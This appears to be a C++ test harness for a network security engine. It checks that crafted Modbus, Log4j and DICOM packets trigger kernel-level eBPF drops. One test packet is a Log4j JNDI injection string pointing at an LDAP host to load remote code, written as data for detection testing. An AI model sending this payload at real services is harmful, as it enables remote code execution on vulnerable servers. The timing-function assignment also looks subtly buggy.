#include <iostream>
#include <chrono>
#include <thread>
#include <cassert>
#include <cstring>
#include <filesystem>
#include "sdk/PluginSupervisor.hpp"
#include "nexus/KernelDropInjector.hpp"

                                              using namespace sentinel::sdk;
using namespace sentinel::nexus;

static void mock_log(int level, const char *sender, const char *msg)
{
    const char *lvl_str[] = {"DEBUG", "INFO", "WARN", "ERROR"};
    std::cout << "[" << lvl_str[level] << "] (" << sender << ") " << msg << std::endl;
}

// Live hook into in-kernel eBPF drop injector
static int live_ebpf_drop_ipv4(uint32_t ipv4, uint32_t dur)
{
    return KernelDropInjector::instance().inject_drop_ipv4(ipv4, dur);
}

static void mock_emit_metric(const char * /*name*/, uint64_t /*val*/) {}

static uint64_t mock_time_ns()
{
    return std::chrono::duration_cast<std::chrono::nanoseconds>(
               std::chrono::steady_clock::now().time_since_epoch())
        .count();
}

int main()
{
    std::cout << "============================================================" << std::endl;
    std::cout << "   SENTINEL EXTENSIBILITY PRODUCTION SUITE + LIVE eBPF      " << std::endl;
    std::cout << "============================================================" << std::endl;

    // 1. Initialize In-Kernel eBPF Map
    KernelDropInjector::instance().initialize();

    SentinelHostInterface host{};
    host.engine_version = 10000;
    host.log_message = mock_log;
    host.request_ebpf_drop_ip = live_ebpf_drop_ipv4;
    host.emit_metric_counter = mock_emit_metric;
    host.get_monotonic_time_ns = mock_time_ns();

    PluginSupervisor supervisor(host,
                                "/etc/sentinel/plugins.d",
                                "/etc/sentinel/rules.d",
                                "/etc/sentinel/wasm.d");

    if (!supervisor.initialize())
    {
        std::cerr << "[-] Failed to initialize supervisor!" << std::endl;
        return 1;
    }

    // -------------------------------------------------------------
    // TEST 1: Modbus Coil Override (Native C++20)
    // -------------------------------------------------------------
    uint8_t modbus_write[] = {
        0x00, 0x02, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x10, 0xFF, 0x00};
    SentinelRawPacket pkt1{};
    pkt1.data = modbus_write;
    pkt1.length = sizeof(modbus_write);
    pkt1.timestamp_ns = mock_time_ns();

    for (int i = 0; i < 50; ++i)
        supervisor.evaluate_frame(pkt1);
    SentinelDissectorResult res1 = supervisor.evaluate_frame(pkt1);
    assert(res1.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 2: Log4j Sliding Payload (LuaJIT)
    // -------------------------------------------------------------
    const char log4j_payload[] = "GET /?user=${jndi:ldap://10.240.0.99:1389/Exploit} HTTP/1.1\r\n\r\n";
    SentinelRawPacket pkt2{};
    pkt2.data = reinterpret_cast<const uint8_t *>(log4j_payload);
    pkt2.length = std::strlen(log4j_payload);
    pkt2.timestamp_ns = mock_time_ns();

    for (int i = 0; i < 50; ++i)
        supervisor.evaluate_frame(pkt2);
    SentinelDissectorResult res2 = supervisor.evaluate_frame(pkt2);
    assert(res2.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 3: DICOM PHI Leak (Wasm)
    // -------------------------------------------------------------
    uint8_t dicom_buffer[256];
    std::memset(dicom_buffer, 0, sizeof(dicom_buffer));
    dicom_buffer[128] = 'D';
    dicom_buffer[129] = 'I';
    dicom_buffer[130] = 'C';
    dicom_buffer[131] = 'M';
    dicom_buffer[140] = 0x10;
    dicom_buffer[141] = 0x00;
    dicom_buffer[142] = 0x10;
    dicom_buffer[143] = 0x00;

    SentinelRawPacket pkt3{};
    pkt3.data = dicom_buffer;
    pkt3.length = sizeof(dicom_buffer);
    pkt3.timestamp_ns = mock_time_ns();

    for (int i = 0; i < 50; ++i)
        supervisor.evaluate_frame(pkt3);
    SentinelDissectorResult res3 = supervisor.evaluate_frame(pkt3);
    assert(res3.verdict == SENTINEL_VERDICT_KERNEL_DROP);

    // -------------------------------------------------------------
    // TEST 4: Direct In-Kernel eBPF Map Drop Verification
    // -------------------------------------------------------------
    std::cout << "\n[TEST 4] [eBPF Core Offload] Testing live kernel map insertion..." << std::endl;
    uint32_t hostile_ip = 0x6300F00A; // 10.240.0.99
    host.request_ebpf_drop_ip(hostile_ip, 300);

    bool is_blocked = KernelDropInjector::instance().is_ip_blocked(hostile_ip);
    assert(is_blocked == true);
    std::cout << "[+] Confirmed: IP 10.240.0.99 is actively blocked in kernel BPF map!" << std::endl;

    // -------------------------------------------------------------
    // TEST 5: Render Telemetry Table
    // -------------------------------------------------------------
    supervisor.print_status_table(std::cout);

    std::cout << "============================================================" << std::endl;
    std::cout << " [SUCCESS] Option A (Telemetry + eBPF Offload) Verified!    " << std::endl;
    std::cout << "============================================================" << std::endl;

    supervisor.shutdown();
    return 0;
}
